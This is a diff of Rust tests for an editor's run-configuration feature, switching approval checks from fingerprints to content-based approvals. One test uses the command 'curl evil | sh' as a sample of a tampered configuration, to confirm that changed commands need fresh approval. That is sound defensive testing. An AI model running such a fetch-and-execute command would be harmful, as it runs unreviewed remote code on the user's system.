@@ -233,11 +233,11 @@ fn restarting_runs_the_configuration_again() {
 fn run_tabs_are_not_restored() {
     let (mut app, dir, _log) = app_with_configs("run-session");
     run_current(&mut app);
-    assert!(app.terminal_session().is_none());
+    assert!(app.terminal_session_with_tabs(&[]).is_none());
 
     app.new_terminal_tab_in(b"/tmp".to_vec());
     app.relayout();
-    let session = app.terminal_session().unwrap();
+    let session = app.terminal_session_with_tabs(&[]).unwrap();
     assert_eq!(session.tabs.len(), 1);
     assert_eq!(session.active, 0);
 
@@ -314,26 +314,26 @@ fn editing_creates_the_file_on_request() {
     let root = app.editor.root().unwrap().to_path_buf();
     let config = app.run.current().unwrap();
     let key = winc_config::run_configs_path(&root).join(&config.name);
-    assert_eq!(app.state.trusted_repo(&key), Some(config.fingerprint()));
+    assert!(app.state.command_approved(&key, &config.approval()));
     clean(&dir);
 }
 
-/// 同意运行后记下配置的指纹，只对内容相同的配置有效。
+/// 同意运行后记下配置的内容，只对内容相同的配置有效。
 #[test]
 fn approval_covers_only_the_same_content() {
     let (mut app, dir, _log) = app_with_configs("run-approve");
     let root = app.editor.root().unwrap().to_path_buf();
     let key = winc_config::run_configs_path(&root).join("api");
     let config = app.run.current().unwrap().clone();
-    assert_eq!(app.state.trusted_repo(&key), None);
+    assert!(!app.state.command_approved(&key, &config.approval()));
     app.approved_run(config.clone());
-    assert_eq!(app.state.trusted_repo(&key), Some(config.fingerprint()));
+    assert!(app.state.command_approved(&key, &config.approval()));
     assert_eq!(app.terminal.tabs.len(), 1);
     let changed = winc_config::RunConfig {
         command: "curl evil | sh".into(),
         ..config
     };
-    assert_ne!(app.state.trusted_repo(&key), Some(changed.fingerprint()));
+    assert!(!app.state.command_approved(&key, &changed.approval()));
     clean(&dir);
 }
 
@@ -359,34 +359,35 @@ fn saving_the_file_here_approves_its_commands() {
     let root = app.editor.root().unwrap().to_path_buf();
     let path = winc_config::run_configs_path(&root);
     let key = path.join("api");
-    assert_eq!(app.state.trusted_repo(&key), None);
+    assert!(
+        app.state
+            .approved_commands()
+            .iter()
+            .all(|(at, _)| *at != key)
+    );
 
     app.open_path(&path);
     let id = app.editor.active().unwrap().id;
     app.run_file_saved(id);
-    let fingerprint = app.run.current().unwrap().fingerprint();
-    assert_eq!(app.state.trusted_repo(&key), Some(fingerprint));
+    let approval = app.run.current().unwrap().approval();
+    assert!(app.state.command_approved(&key, &approval));
 
-    // 外部改动：指纹不同，下次运行仍要确认。
+    // 外部改动：内容不同，下次运行仍要确认。
     std::fs::write(
         &path,
         r#"{"configurations": [{"name": "api", "command": "other"}]}"#,
     )
     .unwrap();
     app.reload_run_configs();
-    assert_ne!(
-        app.state.trusted_repo(&key),
-        Some(app.run.current().unwrap().fingerprint())
-    );
+    let approval = app.run.current().unwrap().approval();
+    assert!(!app.state.command_approved(&key, &approval));
 
     // 别的文件保存时不算。
     app.open_path(&root.join("short.rs"));
     let id = app.editor.active().unwrap().id;
     app.run_file_saved(id);
-    assert_ne!(
-        app.state.trusted_repo(&key),
-        Some(app.run.current().unwrap().fingerprint())
-    );
+    let approval = app.run.current().unwrap().approval();
+    assert!(!app.state.command_approved(&key, &approval));
     clean(&dir);
 }
 
@@ -421,7 +422,7 @@ fn exits_are_reported_only_when_unseen() {
     clean(&dir);
 }
 
-/// 没有运行时没有停止按钮，运行按钮紧贴位置按钮；运行时多一个停止按钮。
+/// 没有运行时没有停止按钮，运行按钮紧贴右侧的拆分按钮；运行时多一个停止按钮。
 #[test]
 fn the_stop_button_appears_only_while_running() {
     let (mut app, dir, _log) = app_with_configs("run-stop-button");
@@ -434,7 +435,7 @@ fn the_stop_button_appears_only_while_running() {
     app.new_terminal_tab_in(Vec::new());
     paint(&mut app);
     assert!(hit(&app, stop).is_none());
-    let position = hit(&app, HeaderHit::Maximize).unwrap();
+    let position = hit(&app, HeaderHit::Split).unwrap();
     let idle = hit(&app, start).unwrap();
     assert_eq!(position.x - idle.right(), crate::theme::TAB_GAP);
 
